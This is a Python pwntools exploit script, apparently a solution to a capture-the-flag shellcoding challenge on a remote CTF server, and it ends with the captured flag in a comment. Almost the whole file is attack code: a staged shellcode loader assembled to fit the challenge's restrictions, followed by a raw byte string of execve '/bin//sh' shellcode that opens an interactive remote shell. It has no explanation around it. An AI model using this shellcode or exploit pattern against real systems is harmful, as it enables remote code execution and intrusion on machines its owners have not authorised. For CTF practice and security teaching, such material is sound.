#!/usr/bin/python
from pwn import *
import time

host = 'csie.ctf.tw'
port = 10121 

context.arch = 'amd64'
r = remote(host, port)
x = 'nop\n'*4
x += 'pop rsi\n'*0x4

x += 'pop rsi\npop rbp\npop rbp\npop rcx\npush rbp\npush rbp\npush rbp\npush rdx\n'


x += 'push rdx\n'*8
x += 'xor edx,DWORD PTR [rdx]\n'
x += 'syscall'

x2 = '''
 xor eax, eax
	mov rdi, rsi
	mov rsi, rsp 
	mov al, 0x3b
	mov rdx, 0
	mov rcx, 0
	syscall
'''
r.send(asm(x))
time.sleep(0.5)
r.sendline('a'*0x1c + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
r.interactive()

# FLAG{SUPERB_sh311c0d1ng_ski115!!!}
